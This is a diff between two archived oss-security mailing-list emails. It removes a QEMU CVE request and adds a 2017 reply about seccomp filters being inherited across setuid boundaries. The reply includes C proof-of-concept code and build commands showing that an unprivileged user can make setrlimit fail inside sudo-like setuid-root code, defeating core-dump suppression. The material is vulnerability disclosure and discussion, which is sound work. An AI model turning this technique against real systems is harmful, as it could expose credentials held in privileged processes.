@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["708" "Friday" "14" "October" "2016" "16:44:16" "+0530" "P J P" "ppandit@redhat.com" "<alpine.LFD.2.20.1610141642160.13950@wniryva>" "24" "[oss-security] CVE request Qemu: net: OOB buffer access in rocker switch emulation" nil nil nil "10" "2016101411:14:16" "[oss-security] CVE request Qemu: net: OOB buffer access in rocker switch emulation" (number mark "U       ppandit@redh Oct 14   24/708   " thread-indent "\"[oss-security] CVE request Qemu: net: OOB buffer access in rocker switch emulation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3473" "Sunday" "8" "January" "2017" "12:51:58" "+0100" "Martin Carpenter" "mcarpenter@free.fr" "<1483876318.5179.50.camel@juliet.mcarpenter.org>" "118" "Re: [oss-security] Re: Firejail local root exploit" "^Date:" nil nil "1" "2017010811:51:58" "[oss-security] Re: Firejail local root exploit" (number mark "        mcarpenter@f Jan  8  118/3473  " thread-indent "\"Re: [oss-security] Re: Firejail local root exploit\"\n") "<1483795275.8979.125.camel@juliet.mcarpenter.org>" ("<730e35dc08384f6f9bef4e403802a871@imshyb02.MITRE.ORG>" "<f47526d9-157e-1600-8f64-d737db07753c@web.de>" "<1483795275.8979.125.camel@juliet.mcarpenter.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 23706 invoked by uid 550); 14 Oct 2016 11:14:34 -0000
+Received: (qmail 11922 invoked by uid 550); 8 Jan 2017 13:33:59 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,42 +11,138 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 5842 invoked from network); 8 Jan 2017 11:52:11 -0000
+Message-ID: <1483876318.5179.50.camel@juliet.mcarpenter.org>
+In-Reply-To: <1483795275.8979.125.camel@juliet.mcarpenter.org>
+References: <730e35dc08384f6f9bef4e403802a871@imshyb02.MITRE.ORG>
+	<f47526d9-157e-1600-8f64-d737db07753c@web.de>
+	<1483795275.8979.125.camel@juliet.mcarpenter.org>
+X-Mailer: Evolution 3.10.4-0ubuntu2
+Mime-Version: 1.0
+X-sfr-mailing: LEGIT
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+Date: Sun, 08 Jan 2017 12:51:58 +0100
+From: Martin Carpenter <mcarpenter@free.fr>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 23634 invoked from network); 14 Oct 2016 11:14:33 -0000
-Date: Fri, 14 Oct 2016 16:44:16 +0530 (IST)
-From: P J P <ppandit@redhat.com>
-X-X-Sender: pjp@javelin
-To: oss security list <oss-security@lists.openwall.com>
-cc: Huawei PSIRT <psirt@huawei.com>
-Message-ID: <alpine.LFD.2.20.1610141642160.13950@wniryva>
-MIME-Version: 1.0
-Content-Type: text/plain; format=flowed; charset=US-ASCII
-X-Scanned-By: MIMEDefang 2.68 on 10.5.11.26
-X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.30]); Fri, 14 Oct 2016 11:14:21 +0000 (UTC)
-Subject: [oss-security] CVE request Qemu: net: OOB buffer access in rocker switch
- emulation
+Subject: Re: [oss-security] Re: Firejail local root exploit
+To: oss-security@lists.openwall.com
 
-   Hello,
+On Sat, 2017-01-07 at 14:21 +0100, Martin Carpenter wrote:
+> prctl(PR_CAPBSET_DROP, ...) (see caps.c) requires CAP_SETPCAP. 
 
-Quick Emulator(Qemu) built with the Rocker switch emulation support is 
-vulnerable to an OOB read access issue. It could occur while performing a DMA 
-access 'TEST_DMA_CTRL_INVERT' test.
+Oops, I was looking at the wrong flag: PR_SECCOMP_SET doesn't require
+capabilities. Thanks sivmu.
 
-A privileged guest user could use this issue to crash the Qemu process 
-instance on the host resulting in DoS.
+So that... doesn't improve things, quite the opposite. Here's
+disable_coredumps() from sudo 1.8.9p5 (as shipped with Ubuntu 14.04,
+which does not disable suid coredumps on desktop by default):
 
-Upstream patch:
----------------
-   -> https://lists.gnu.org/archive/html/qemu-devel/2016-10/msg02501.html
+ 784 /*
+ 785  * Disable core dumps to avoid dropping a core with user password
+in it.
+ 786  * We will reset this limit before executing the command.
+ 787  * Not all operating systems disable core dumps for setuid
+processes.
+ 788  */
+ 789 static void
+ 790 disable_coredumps(void)
+ 791 {
+ 792 #if defined(RLIMIT_CORE)
+ 793     struct rlimit rl;
+ 794     debug_decl(disable_coredumps, SUDO_DEBUG_UTIL)
+ 795 
+ 796     /*
+ 797      * Turn off core dumps?
+ 798      */
+ 799     if (sudo_conf_disable_coredump()) {
+ 800     (void) getrlimit(RLIMIT_CORE, &corelimit);
+ 801     memcpy(&rl, &corelimit, sizeof(struct rlimit));
+ 802     rl.rlim_cur = 0;
+ 803     (void) setrlimit(RLIMIT_CORE, &rl);
+ 804     }
+ 805     debug_return;
+ 806 #endif /* RLIMIT_CORE */
+ 807 }
 
-Reference:
-----------
-   -> https://bugzilla.redhat.com/show_bug.cgi?id=1384896
+The return value from setrlimit() at line 803 is not checked.
 
-This issue was reported by Huawei Product Security Incident Response Team 
-(PSIRT), Huawei Inc.
+PoC: two programs (below): foo, to set up a seccomp filter (using
+libseccomp) to fail calls to setrlimit() and then fork/exec bar, which
+duplicates disable_coredumps() above, setuid-root, 4755. All works as
+expected: a non-privileged user can prevent the call to setrlimit() in
+privileged bar and execution continues. (The filter is inherited since
+calls to fork, exec are not blocked).
 
-Thank you.
---
-Prasad J Pandit / Red Hat Product Security Team
-47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
+Again we can probably push root cause off to sudo's failure to check the
+setrlimit() return value (or Ubuntu's defaults...) but pragmatically
+there just has to be more stuff out there like this. sudo was literally
+the first thing I looked at... Disabling filter inheritance across the
+privilege boundary doesn't seem like an obviously good solution(?).
+
+OpenBSD's pledge(2), by contrast, only sends uncatchable-SIGABRT and
+pledges are not inherited by subprocesses, privileged or not.
+
+
+$ cat foo.c
+
+#include <linux/seccomp.h>
+#include <seccomp.h>
+#include <stdio.h>
+#include <sys/prctl.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+int main(int argc, const char *argv[])
+{
+  int status;
+  char *args[] = { "./bar", NULL };
+  scmp_filter_ctx ctx;
+  switch(fork()) {
+      case -1: /* error */
+          perror("fork");
+          return 1;
+          break;
+      case 0: /* child */
+          ctx = seccomp_init(SCMP_ACT_ALLOW); // permit all
+          seccomp_rule_add(ctx, SCMP_ACT_ERRNO(1), SCMP_SYS(setrlimit),
+0); // blacklist setrlimit
+          seccomp_load(ctx);
+          execv(args[0], args);
+          perror("execv");
+          _exit(1);
+          break;
+      default:
+          if(-1 == wait(&status)) {
+              perror("wait");
+              return 1;
+          }
+          printf("exit code %d\n", WEXITSTATUS(status));
+  }
+  return 0; 
+}
+$ cat bar.c
+
+#include <sys/time.h>
+#include <sys/resource.h>
+#include <string.h>
+
+int main(int argc, const char *argv[])
+{
+    struct rlimit rl;
+    struct rlimit corelimit;
+    (void) getrlimit(RLIMIT_CORE, &corelimit);
+    memcpy(&rl, &corelimit, sizeof(struct rlimit));
+    rl.rlim_cur = 0;
+    return setrlimit(RLIMIT_CORE, &rl) ? 2 : 0;
+}
+$ gcc -o foo foo.c -lseccomp
+$ gcc -o bar bar.c
+$ sudo chown root bar
+$ sudo chmod 4755 bar
+$ ./foo 
+exit code 2
+$
+
+
